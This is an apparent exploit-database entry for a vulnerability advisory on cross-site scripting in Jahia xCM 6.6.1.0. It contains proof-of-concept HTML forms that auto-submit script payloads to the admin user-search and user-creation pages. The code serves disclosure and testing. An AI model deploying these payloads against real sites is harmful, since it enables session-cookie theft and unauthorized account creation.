@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/61571/info
+ 
+Jahia xCM is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+ 
+An attacker could exploit these vulnerabilities to execute arbitrary script code in the context of the affected website. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+ 
+Jahia xCM 6.6.1.0 r43343 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/administration/?do=users&sub=search" method="post" name="main">
+<input type="hidden" name="searchString" value="'><script>alert(document.cookie);</script>">
+<input type="submit" id="btn">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+<form action="http://www.example.com/administration/?do=users&sub=processCreate" method="post" name="main">
+<input type="hidden" name="username" value="'><script>alert(document.cookie);</script>">
+<input type="hidden" name="manage-user-property#j:firstName" value="'><script>alert(document.cookie);</script>">
+<input type="hidden" name="manage-user-property#j:lastName" value="'><script>alert(document.cookie);</script>">
+<input type="hidden" name="manage-user-property#j:email" value="'><script>alert(document.cookie);</script>">
+<input type="hidden" name="manage-user-property#j:organization" value="'><script>alert(document.cookie);</script>">
+<input type="hidden" name="actionType" value='save'>
+<input type="submit" id="btn">
+</form>
+<script>
+document.main.submit();
+</script>
